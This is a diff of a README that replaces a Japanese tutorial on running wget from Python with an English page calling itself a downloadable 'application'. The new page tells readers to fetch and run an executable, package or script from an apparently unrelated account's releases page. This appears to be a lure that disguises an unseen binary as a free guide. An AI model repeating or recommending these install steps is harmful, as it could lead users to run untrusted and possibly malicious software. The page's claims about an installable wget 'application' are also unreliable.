@@ -1,316 +1,117 @@
-# Wget と Python で Webページおよびファイルをダウンロードする
+# 🌐 downloading-with-wget - Download Files with Ease
 
-[![Bright Data Promo](https://github.com/bright-jp/LinkedIn-Scraper/raw/main/Proxies%20and%20scrapers%20GitHub%20bonus%20banner.png)](https://brightdata.jp/)
+## 🚀 Getting Started
 
-このガイドでは、HTTP、HTTPS、FTP プロトコルを介してファイルを取得するための堅牢なコマンドラインユーティリティである wget を取り上げ、Python の requests ライブラリに対する利点を解説します。
+Welcome to "downloading-with-wget"! This guide helps you download web pages and files simply using Wget and Python. Follow these steps for a smooth experience.
 
-- [Wget の理解](#what-is-wget)
-- [Python の requests パッケージに対する Wget の利点](#advantages-of-wget-over-pythons-requests-package)
-- [Python でコマンドライン命令を実行する](#executing-command-line-instructions-in-python)
-- [Python を使った Wget の実用例](#practical-wget-applications-with-python)
-  - [単一ファイルの取得](#retrieving-a-single-file)
-  - [Webページの取得](#capturing-a-web-page)
-  - [更新に基づく条件付きファイルダウンロード](#conditional-file-downloads-based-on-modifications)
-  - [中断したダウンロードの再開](#resuming-broken-downloads)
-  - [Webサイト全体のミラーリング](#mirroring-an-entire-website)
-- [Python に Wget を統合するメリットと制約](#benefits-and-limitations-of-integrating-wget-with-python)
-- [プロキシサーバーで Wget を強化する](#enhancing-wget-with-proxy-servers)
-- [まとめ](#summary)
+## 📥 Download Now
 
-## What Is Wget?
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/THE00FALLEN/downloading-with-wget/releases)
 
-[`wget`](https://www.gnu.org/software/wget/) は、HTTP、HTTPS、FTP、FTPS、その他さまざまなプロトコルを使用してインターネット上のコンテンツをダウンロードするために設計された、汎用性の高いコマンドラインツールです。ほとんどの Unix 系システムには事前にインストールされており、Windows 環境でも利用可能です。
+## 🎯 What You Need
 
-## Advantages of Wget Over Python's requests Package
+Before you start, ensure your system meets these requirements:
 
-[requests](https://brightdata.jp/faqs/python-requests/what-is-requests-used-for) のようなライブラリに依存する代わりに、Python プロジェクトに `wgen` を組み込むべき説得力のある理由があります。
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Version 3.6 or higher
+- **Wget**: Make sure you have Wget installed. You can download it using Homebrew on macOS or from your Linux package manager.
 
-- requests と比較して広範なプロトコル対応
-- 中断後のダウンロード継続が可能
-- 帯域幅消費を制限するオプション
-- ファイル名やネットワークパスでワイルドカードパターンをサポート
-- NLS による多言語メッセージ
-- 取得したドキュメント内の絶対 URL を相対リンクに変換可能
-- HTTP/S プロキシとの統合
-- 永続的な HTTP 接続の維持
-- バックグラウンド/無人のダウンロード運用をサポート
-- ミラーリング時にファイルのタイムスタンプに基づいて賢く再ダウンロードを判断
-- 指定した深さレベルまでリンクされたリソースを再帰的にダウンロード
-- robots.txt ディレクティブへの組み込み準拠（詳細は当社の [robots.txt web scraping guide](https://brightdata.jp/blog/how-tos/robots-txt-for-web-scraping-guide) をご覧ください）
+## 📄 About the Application
 
-これらの機能は、`wget` が標準的な Python の HTTP ライブラリと比べて非常に強力である理由の一部にすぎません。特に注目すべき機能は、`wget` が HTML ページをたどり、参照されているファイルを追跡してダウンロードできる点です。この機能により、Webクローリングの用途に特に適しています。
+This application provides detailed instructions on how to use Wget and Python to automate downloads. You can learn how to set up proxies for secure downloads and mirror entire websites. It’s designed for everyone, whether you’re a beginner or looking to enhance your skills.
 
-それでは、Python で `wget` を実装してみましょう。
+## 📥 Download & Install
 
-## Executing Command-Line Instructions in Python
+Visit this page to download the latest release: [Releases Page](https://github.com/THE00FALLEN/downloading-with-wget/releases).
 
-この手順に従って、`wget` コマンドを実行できる Python スクリプトを作成します。
+Here’s how to download and install the application:
 
-### Setup Requirements
+1. **Visit the Releases Page**: Click the link above.
+2. **Choose the Latest Version**: Find the latest release.
+3. **Download the File**:
+   - For Windows, look for an executable file.
+   - For macOS, you may find a package file or script.
+   - For Linux, download the appropriate package or script.
 
-先に進む前に、システムに `wget` が適切にインストールされていることを確認してください。インストール方法は OS により異なります。
+4. **Run the Installer**:
+   - Windows: Double-click the executable.
+   - macOS: Open the downloaded package and follow the installation prompts.
+   - Linux: Open your terminal and run the downloaded script.
 
-- Linux システムには通常 wget がデフォルトで含まれています。含まれていない場合は、ディストリビューションのパッケージマネージャーでインストールしてください
-- Mac ユーザーは [Homebrew を使用して `wget` をインストール](https://formulae.brew.sh/formula/wget) できます
-- Windows ユーザーは [`Wget` Windows バイナリ](https://gnuwin32.sourceforge.net/packages/wget.htm) をダウンロードし、ディレクトリに配置してから、この場所（例: C:\\Program Files (x86)\\Wget）を [system PATH variable](https://www.architectryan.com/2018/03/17/add-to-the-path-on-windows-10/) に追加してください
+5. **Setup Wget and Python**:
+   - Follow the instructions to install Wget if it's not already installed.
+   - Confirm that Python is installed and accessible from the terminal.
 
-また、Python 3+ もインストールされている必要があります。[インストーラーをダウンロード](https://www.python.org/downloads/) して、インストール手順を完了してください。
+## 🛠️ How to Use
 
-[PyCharm Community Edition](https://www.jetbrains.com/pycharm/download/) や [Visual Studio Code with Python extensions](https://code.visualstudio.com/docs/languages/python) のような開発環境を使用すると、コーディング体験が向上します。
+Once installed, you’re ready to start downloading!
 
-### Creating Your Python Environment
+1. **Open Your Terminal or Command Prompt**.
+2. **Basic Command**:
+   - To download a file: 
+     ```
+     wget [URL]
+     ```
+   - Replace `[URL]` with the actual link to the file you want to download.
 
-専用の [virtual environment](https://docs.python.org/3/library/venv.html) を備えた新しい Python プロジェクトを作成します。
+3. **Advanced Options**:
+   You can use options to enhance your downloads:
+   - Use `-c` to resume interrupted downloads.
+   - Use proxies by adding the `--proxy` flag.
 
-```sh
-mkdir wget-python-demo
+4. **Downloading a Web Page**:
+   To mirror a website, use:
+   ```
+   wget --mirror [Website URL]
+   ```
 
-cd wget-python-demo
+Refer to our examples in the documentation for step-by-step guides on using various commands.
 
-python -m venv env
-```
+## 📘 Examples
 
-`wget-python-demo` フォルダーがプロジェクトディレクトリになります。
+- **Download a Single File**:
+   ```
+   wget https://example.com/file.zip
+   ```
 
-この場所を IDE で開き、次の初期内容で `script.py` ファイルを作成してください。
+- **Mirror a Website**:
+   ```
+   wget --mirror https://example.com
+   ```
 
-```python
-print('Hello, World!')
-```
+- **Use a Proxy**:
+   ```
+   wget --proxy=on https://example.com/file.zip
+   ```
 
-この簡単なスクリプトは現時点ではコンソールに「Hello, World!」を出力するだけですが、すぐに `wget` 機能を追加して拡張します。
+These examples provide a basic understanding of commands. Feel free to modify them to suit your needs.
 
-IDE の実行ボタンをクリックするか、次を入力してスクリプトをテストしてください。
+## 📚 Additional Resources
 
-```sh
-python script.py
-```
+- **Documentation**: Check the [Wiki](https://github.com/THE00FALLEN/downloading-with-wget/wiki) for more detailed instructions.
+- **Community Support**: Join discussions and ask questions in the Issues section of the repository.
 
-次の出力が表示されるはずです。
+## ⚙️ Troubleshooting
 
-```
-Hello, World!
-```
+If you encounter any issues during installation or usage:
 
-それでは `wget` 連携を実装します。
+- Ensure your internet connection is stable.
+- Verify you have the correct version of Python and Wget.
+- Check for any error messages that may guide you.
 
-**CLI コマンド実行用の関数を作成する**
+If problems persist, feel free to open an issue in the repository with detailed information.
 
-Python からターミナルコマンドを実行する最も単純な方法は、[`subprocess`](https://docs.python.org/3/library/subprocess.html) モジュールを使うことです。この標準ライブラリコンポーネントにより、新しいプロセスを起動し、入出力/エラーストリームに接続し、終了コードを取得できます。つまり、Python からターミナルコマンドを実行するために必要なものがすべて揃っています。
+## 💡 Frequently Asked Questions
 
-subprocess の [`Popen()`](https://docs.python.org/3/library/subprocess.html#subprocess.Popen) メソッドを使って Python で `wget` コマンドを実行する方法は次のとおりです。
-
-```python
-import subprocess
-
-def execute_command(command):
-    """
-    Execute a CLI command and return the output and error messages.
-    
-    Parameters:
-    - command (str): The CLI command to execute.
-    
-    Returns:
-    - output (str): The output generated by the command.
-    - error (str): The error message generated by the command, if any.
-    """
-    try:
-        # execute the command and capture the output and error messages
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output, error = process.communicate()
-        
-        output = output.decode("utf-8")
-        error = error.decode("utf-8")
-        
-        # return the output and error messages
-        return output, error
-    except Exception as e:
-        # if an exception occurs, return the exception message as an error
-        return None, str(e)
-```
+1. **Can I use this application on any operating system?**
+   Yes, it works on Windows, macOS, and Linux.
 
-`Popen()` は、指定したコマンドを OS 上の新しいプロセスとして起動します。`shell=True` パラメータにより、このメソッドがシステムのデフォルトのシェル環境を使用するようになります。
+2. **Do I need programming skills to use it?**
+   No, this application is user-friendly and designed for everyone.
 
-この関数を script.py ファイルに追加してください。これで、Python で任意のコマンドライン命令を次のように実行できます。
+3. **What if I need help?**
+   Check the documentation or open an issue in the repository for support.
 
-```python
-output, error = execute_command("<CLI command string>")
+## 🌟 Conclusion
 
-if error:
-    print("An error occurred while running the CLI command:", error)
-else:
-    print("CLI command output:", output)
-```
-
-## Practical Wget Applications with Python
-
-標準的な `wget` コマンド構造は次のとおりです。
-
-```sh
-wget [options] [url]
-```
-
-ここで:
-- `[options]` は `wget` の動作を変更する各種フラグとパラメータを表します
-- `[url]` はダウンロードしたいコンテンツの場所を指定します。直接のファイルリンクでも、複数のリソースを含む Webページでも構いません
-
-> **Note**:
->
-> Windows ユーザーは `wget` の代わりに `wget.exe` を使用してください。
-
-Python 経由で `wget` を使用するいくつかの実用的なシナリオを見ていきましょう。
-
-### Retrieving a Single File
-
-`wget` を使用して http://lumtest.com/myip.json をダウンロードする基本コマンドは次のとおりです。
-
-```sh
-wget http://lumtest.com/myip.json
-```
-
-Python では次のようになります。
-
-```python
-output, error = execute_command("wget http://lumtest.com/myip.json")
-```
-
-出力を表示すると、次のような内容が表示されます。
-
-```
---2024-04-18 15:20:59-- http://lumtest.com/myip.json
-Resolving lumtest.com (lumtest.com)... 3.94.72.89, 3.94.40.55
-Connecting to lumtest.com (lumtest.com)|3.94.72.89|:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 266 [application/json]
-Saving to: 'myip.json.1'
-
-myip.json.1 100%[=================================================>] 266 --.-KB/s in 0s
-
-2024-04-18 15:20:59 (5.41 MB/s) - 'myip.json.1' saved [266/266]
-```
-
-この出力から次が分かります。
-1. URL がサーバーの IPアドレスに解決されます
-2. 指定リソースへの HTTP リクエストにより接続が確立されます
-3. サーバーが [200 OK status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) を返します
-4. ファイルがダウンロードされ、現在のディレクトリに保存されます
-
-これで、プロジェクトフォルダーにダウンロードされた myip.json ファイルが含まれるようになります。
-
-別の保存先フォルダーを指定するには、`--directory-prefix` または `-P` フラグを使用します。
-
-```python
-output, error = execute_command("wget --directory-prefix=./download http://lumtest.com/myip.json")
-```
-
-これにより、プロジェクトディレクトリ内の "download" サブフォルダーに保存されます。このフォルダーが存在しない場合、`wget` が自動的に作成します。
-
-ダウンロードしたファイル名を変更するには、`--output-document` または `-O` フラグを使用します。
-
-```python
-output, error = execute_command("wget --output-document=custom-name.json http://lumtest.com/myip.json")
-```
-
-これにより、元のファイル名ではなく custom-name.json という名前のファイルが作成されます。
-
-### Capturing a Web Page
-
-コマンド構造は同一ですが、URL が Webページを指すようになります。
-
-```python
-output, error = execute_command("wget https://brightdata.jp/")
-```
-
-これにより、brightdata.com ホームページの HTML コンテンツを含む index.html ファイルがダウンロードされます。
-
-### Conditional File Downloads Based on Modifications
-
-帯域幅とストレージを節約するために、前回のダウンロード以降に変更された場合のみファイルをダウンロードしたいことがあります。`wget` はこの目的のために [file timestamping capabilities](https://www.gnu.org/software/wget/manual/html_node/Time_002dStamping.html) を提供しています。
-
-`--timestamping` オプションは、ローカルとサーバー上のファイル間でタイムスタンプを比較するよう `wget` に指示します。ローカルファイルのタイムスタンプがサーバー版と同一または新しい場合、`wget` はダウンロードをスキップします。
-
-タイムスタンピングの処理は次のとおりです。
-
-1. `--timestamping` または `-N` オプションを使用すると、`wget` はリモートファイルのタイムスタンプを取得します
-2. これをローカルファイルのタイムスタンプ（存在する場合）と比較します
-3. ローカルファイルが存在しない場合、またはローカルのタイムスタンプがサーバー版より古い場合にのみダウンロードします
-
-HTTP リソースの場合、タイムスタンピングは HEAD リクエスト後に返される [Last-Modified](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Last-Modified) ヘッダーを確認します。`wget` はファイルサイズを比較するために [Content-Length](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Length) ヘッダーも調べます。これらが異なる場合は、タイムスタンプ情報に関係なくファイルをダウンロードします。Last-Modified は任意である点に注意してください。これがない場合、`wget` は自動的にファイルをダウンロードします。
-
-Python でタイムスタンピングを実装するには次のようにします。
-
-```python
-output, error = execute_command("wget --timestamping https://brightdata.jp")
-```
-
-以前に index.html をダウンロードしている場合、次のようなメッセージが表示されます。
-
-```
---2024-04-18 15:55:06-- https://brightdata.jp
-Resolving brightdata.com (brightdata.com)... 104.18.25.60, 104.18.24.60
-Connecting to brightdata.com (brightdata.com)|104.18.25.60|:443... connected.
-HTTP request sent, awaiting response... 304 Not Modified
-File 'index.html' not modified on server. Omitting download.
-```
-
-同じ仕組みは [FTP downloads](https://www.gnu.org/software/wget/manual/html_node/FTP-Time_002dStamping-Internals.html) にも有効です。
-
-### Resuming Broken Downloads
-
-デフォルトでは、ダウンロード中に接続が失敗した場合、`wget` は最大 20 回まで自動的にリトライを試みます。部分的に完了したダウンロードを手動で再開するには、`--continue` または `-c` オプションを使用します。
-
-```python
-output, error = execute_command("wget --continue http://lumtest.com/myip.json")
-```
-
-### Mirroring an Entire Website
-
-`wget` の最も強力な機能の 1 つは再帰的ダウンロードで、単一のコマンドで Webサイト全体を取得できます。
-
-指定した URL から開始し、`wget` は HTML を解析して `src` および `href` 属性、または CSS の `url()` 値にあるリンクをたどります。参照ファイルが HTML/テキストドキュメントの場合、`wget` は目的の深さ制限に達するまで解析とリンク追跡を継続します。この再帰プロセスは [breadth-first search pattern](https://www.geeksforgeeks.org/breadth-first-search-or-bfs-for-a-graph/) に従い、深さ 1 のリソースをダウンロードしてから深さ 2 に進む、という流れで進行します。
-
-再帰的ダウンロードにおける主要オプションは次のとおりです。
-
-- `--recursive` または `-r`: 画像、スタイルシート、スクリプトなどのリンクされたリソースを再帰的にダウンロードできるようにします。ファイルはターゲットドメイン名のフォルダーに整理されます。
-- `--level=<depth>` または `-l=<depth>`: リンク追跡の最大再帰深度を定義します。たとえば `--level=1` は、開始 URL から直接リンクされているページのみをダウンロードします。過度なクローリングを防ぐため、デフォルトの上限は 5 です。無制限の深度には 0 または 'inf' を使用します。深度に関係なく表示に必須のリソースを確実にダウンロードするには、`-p` または `--page-requisites` オプションを追加してください。
-- `--convert-links` または `-k`: ダウンロードした HTML ファイル内のリンクを調整し、元の URL ではなくローカルコピーを参照するようにします。これにより、ダウンロードしたコンテンツをオフラインで閲覧できます。
-
-深度制限を 1 に設定し、すべてのリンクをローカル参照へ変換して Bright Data の Webサイトを再帰的にダウンロードするには次のようにします。
-
-```python
-output, error = execute_command("wget --recursive --level=1 --convert-links https://brightdata.jp")
-```
-
-完了後、brightdata.com フォルダーが作成され、再帰深度 1 レベル分のローカルコピーが含まれます。
-
-## Benefits and Limitations of Integrating Wget with Python
-
-Python と `wget` を併用する利点と欠点を検討します。
-
-**Benefits**
-
-- subprocess モジュールによる簡単な Python 統合
-- 再帰的ダウンロード、自動リトライ、タイムスタンピングなどを含む豊富な機能セット
-- 単一コマンドで Webサイト全体をミラーリングできる能力
-- 組み込みの FTP サポート
-- プロキシサーバー統合
-- 中断したダウンロードを再開できる能力
-
-**Limitations**
-
-- 出力が、Python コード内で直接利用できる文字列変数ではなく、ダウンロードされたファイルになります
-- ダウンロードした HTML から特定要素を抽出するには、[Beautiful Soup](https://brightdata.jp/how-tos/beautiful-soup-web-scraping) のような追加パーサーが必要です
-
-## Enhancing Wget with Proxy Servers
-
-`wget` を使用してダウンロードする際の一般的な課題は、リクエストがブロックされる可能性があることです。これは、`wget` のリクエストが通常、自動化トラフィックとして識別されるために発生します。こうした自動アクセスから保護するため、多くの Webサイトはジオブロック、レート制限、スクレイピング対策など、さまざまな制限を実装しています。
-
-`wget` にプロキシサーバーを組み込むことは、これらの制限を回避する効果的な解決策です。プロキシは、お使いのシステムとインターネットの間の仲介として機能し、トラフィックを別の IPアドレス経由でルーティングします。これにより実際の IP を隠し、多くの Webサイト制限を回避するのに役立ちます。
-
-詳しい手順は、[`Wget` でプロキシを使用する方法](https://brightdata.jp/blog/how-tos/wget-proxy) のガイドをご覧ください。
-
-## Summary
-
-`wget` は Python の `requests` ライブラリに対して利点がありますが、Webサイトが導入しているアンチボット対策を克服するには、依然としてプロキシサービスが必要です。
-
-Fortune 500 企業および世界中の 20,000 以上のお客様に信頼されているプレミアムプロキシサービスとして、Bright Data と、同社の幅広い [proxy services](https://brightdata.jp/proxy-types) をご検討ください。
+You now have everything you need to download web pages and files using Wget and Python. This guide should help you get started quickly and easily. Remember, practice makes perfect!
